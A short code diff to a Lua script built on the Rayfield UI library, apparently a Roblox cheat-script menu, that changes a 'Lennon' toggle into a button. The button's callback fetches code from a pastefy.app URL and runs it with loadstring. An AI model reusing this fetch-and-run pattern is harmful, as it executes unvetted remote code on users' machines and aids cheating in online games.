@@ -39,11 +39,9 @@ local Window = Rayfield:CreateWindow({
 local Tab = Window:CreateTab("Main", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("Scripts")
 
-local Toggle = Tab:CreateToggle({
+local Button = Tab:CreateButton({
    Name = "Lennon",
-   CurrentValue = false,
-   Flag = "getgenv().Lennon = false", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
+   Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/1FPEhJmq/raw"))()
    end,
 })
